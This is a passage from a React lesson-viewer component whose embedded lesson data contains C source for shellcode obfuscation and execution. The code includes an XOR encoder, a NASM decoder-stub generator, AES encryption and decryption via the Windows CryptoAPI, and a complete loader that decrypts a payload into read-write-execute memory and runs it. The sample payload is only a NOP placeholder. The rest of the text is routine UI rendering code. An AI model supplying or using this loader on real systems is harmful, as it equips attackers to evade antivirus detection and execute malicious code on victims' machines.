
// Multi-byte XOR
void XOREncodeMulti(BYTE* data, SIZE_T size, 
                    BYTE* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Generate XOR decoder stub
void GenerateXORDecoder(BYTE key) {
    printf("; XOR Decoder Stub (NASM)\\n");
    printf("decoder_start:\\n");
    printf("    lea rsi, [rel shellcode]\\n");
    printf("    mov rcx, shellcode_len\\n");
    printf("decode_loop:\\n");
    printf("    xor byte [rsi], 0x%02X\\n", key);
    printf("    inc rsi\\n");
    printf("    loop decode_loop\\n");
    printf("    jmp shellcode\\n");
    printf("shellcode:\\n");
    printf("    ; Encoded shellcode here\\n");
}

// AES encryption for shellcode
BOOL AESEncrypt(BYTE* pData, DWORD dwDataLen,
                BYTE* pKey, DWORD dwKeyLen,
                BYTE** ppEncrypted, DWORD* pdwEncLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    
    // Acquire context
    if (!CryptAcquireContextA(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // Create hash of key
    if (!CryptCreateHash(hProv, CALG_SHA_256, 
        0, 0, &hHash)) {
        goto cleanup;
    }
    
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
        goto cleanup;
    }
    
    // Derive AES key
    if (!CryptDeriveKey(hProv, CALG_AES_256, 
        hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    // Allocate output buffer (size + padding)
    DWORD dwEncLen = dwDataLen + AES_BLOCK_SIZE;
    BYTE* pEncrypted = (BYTE*)malloc(dwEncLen);
    memcpy(pEncrypted, pData, dwDataLen);
    
    // Encrypt
    DWORD dwSize = dwDataLen;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, 
        pEncrypted, &dwSize, dwEncLen)) {
        free(pEncrypted);
        goto cleanup;
    }
    
    *ppEncrypted = pEncrypted;
    *pdwEncLen = dwSize;
    bResult = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return bResult;
}

// Runtime decryption
BOOL AESDecrypt(BYTE* pEncrypted, DWORD dwEncLen,
                BYTE* pKey, DWORD dwKeyLen,
                BYTE** ppDecrypted, DWORD* pdwDecLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    
    if (!CryptAcquireContextA(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 
        0, 0, &hHash)) {
        goto cleanup;
    }
    
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
        goto cleanup;
    }
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, 
        hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    // Allocate and decrypt
    BYTE* pDecrypted = (BYTE*)malloc(dwEncLen);
    memcpy(pDecrypted, pEncrypted, dwEncLen);
    
    DWORD dwSize = dwEncLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, 
        pDecrypted, &dwSize)) {
        free(pDecrypted);
        goto cleanup;
    }
    
    *ppDecrypted = pDecrypted;
    *pdwDecLen = dwSize;
    bResult = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return bResult;
}

// Complete example: Encrypted shellcode loader
int main() {
    // Original shellcode (calc.exe example)
    BYTE shellcode[] = {
        0x90, 0x90, 0x90,  // NOP sled
        // ... actual shellcode
    };
    
    DWORD shellcodeLen = sizeof(shellcode);
    
    // Encryption key
    BYTE key[] = "MySecretKey123!";
    DWORD keyLen = sizeof(key) - 1;
    
    // Encrypt
    BYTE* pEncrypted = NULL;
    DWORD dwEncLen = 0;
    
    if (!AESEncrypt(shellcode, shellcodeLen,
        key, keyLen, &pEncrypted, &dwEncLen)) {
        printf("[-] Encryption failed\\n");
        return 1;
    }
    
    printf("[+] Encrypted %d bytes -> %d bytes\\n",
           shellcodeLen, dwEncLen);
    
    // At runtime: decrypt and execute
    BYTE* pDecrypted = NULL;
    DWORD dwDecLen = 0;
    
    if (!AESDecrypt(pEncrypted, dwEncLen,
        key, keyLen, &pDecrypted, &dwDecLen)) {
        printf("[-] Decryption failed\\n");
        return 1;
    }
    
    printf("[+] Decrypted %d bytes\\n", dwDecLen);
    
    // Allocate executable memory
    LPVOID pExec = VirtualAlloc(NULL, dwDecLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    memcpy(pExec, pDecrypted, dwDecLen);
    
    // Execute
    ((void(*)())pExec)();
    
    // Cleanup
    VirtualFree(pExec, 0, MEM_RELEASE);
    free(pDecrypted);
    free(pEncrypted);
    
    return 0;
}

#pragma comment(lib, "advapi32.lib")`,
          language: "c"
        }
      ]
    }
  };

  const currentLesson = lessons[moduleId];

  if (!currentLesson) {
    return (
      <Card className="p-8 bg-gradient-to-br from-card to-card/50 border-border/50 backdrop-blur">
        <div className="text-center space-y-4">
          <BookOpen className="h-16 w-16 text-muted-foreground/50 mx-auto" />
          <p className="text-lg text-muted-foreground">Select a module to begin your journey into systems programming</p>
          <p className="text-sm text-muted-foreground/70">Each module contains theory, practical examples, and working code</p>
        </div>
      </Card>
    );
  }

  return (
    <Card className="h-[600px] flex flex-col bg-card border-border shadow-lg">
      <div className="p-4 border-b border-border/50 flex items-center gap-3 bg-gradient-to-r from-primary/5 to-transparent">
        <div className="p-2 rounded-lg bg-primary/10">
          <BookOpen className="h-5 w-5 text-primary" />
        </div>
        <div className="flex-1">
          <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
          <p className="text-xs text-muted-foreground">{currentLesson.sections.length} sections</p>
        </div>
      </div>
      
      <ScrollArea className="flex-1 p-6">
        <div className="space-y-10">
          {currentLesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-4 group">
              <div className="flex items-start gap-3">
                <div className="mt-1 w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center text-sm font-bold text-primary shrink-0">
                  {idx + 1}
                </div>
                <div className="flex-1">
                  <h4 className="text-lg font-semibold text-foreground mb-2">{section.title}</h4>
                  <div className="prose prose-sm max-w-none">
                    <p className="text-sm text-muted-foreground whitespace-pre-line leading-relaxed">{section.content}</p>
                  </div>
                </div>
              </div>
              
              {section.code && (
                <div className="relative ml-11 group-hover:shadow-lg transition-shadow duration-200">
                  <div className="absolute top-3 right-3 z-10">
                    <Badge variant="secondary" className="text-xs font-mono">
                      {section.language}
                    </Badge>
                  </div>
                  <pre className="bg-muted/50 backdrop-blur p-5 rounded-lg overflow-x-auto text-xs border border-border/50">
                    <code className="text-foreground font-mono whitespace-pre leading-relaxed">{section.code}</code>
                  </pre>
                </div>
              )}
            </div>
          ))}
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
